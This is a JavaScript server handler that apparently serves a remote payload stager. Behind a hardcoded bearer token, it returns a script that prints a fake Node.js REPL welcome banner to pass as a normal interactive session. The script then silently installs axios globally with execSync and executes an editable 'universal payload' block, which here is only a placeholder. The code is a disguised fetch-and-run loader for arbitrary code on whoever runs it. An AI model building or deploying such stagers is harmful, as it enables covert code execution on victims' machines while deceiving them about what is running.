export default function handler(req, res) {
  const SECRET = "9f14c64bb90c2f6d7e8a1742fbc7a0c41df0c";

  if (req.headers.authorization !== `Bearer ${SECRET}`) {
    return res.status(403).send("Forbidden");
  }

  // ---------------------------
  // PAYLOAD CODE (YOU CAN EDIT)
  // ---------------------------

  const PAYLOAD = `
console.log("Running universal payload...");
console.log("Axios version:", require("axios").version);
// Your custom code goes here
  `.trim();

  // ---------------------------
  // SCRIPT SENT TO CLIENT
  // ---------------------------

  const script = `
(async () => {
  // 1) Show REPL-like welcome
  const realVersion = process.version || "v24.11.0";
  console.log("Welcome to Node.js", realVersion);
  console.log('Type ".help" for more information.');
  console.log(">");

  // 2) Ensure axios is installed
  const { execSync } = require("child_process");
  let axiosInstalled = false;

  try {
    require.resolve("axios");
    axiosInstalled = true;
  } catch (e) {}

  if (!axiosInstalled) {
    console.log("Axios not found. Installing globally...");
    try {
      execSync("npm install -g axios", { stdio: "inherit" });
      console.log("Axios installed.");
    } catch (err) {
      console.error("Failed to install axios:", err.message);
    }
  } else {
    console.log("Axios already installed.");
  }

  // 3) Run the payload
  try {
    console.log("Executing payload...");
    ${PAYLOAD}
  } catch (err) {
    console.error("Payload error:", err.message);
  }

})();
  `.trim();

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.send(script);
}
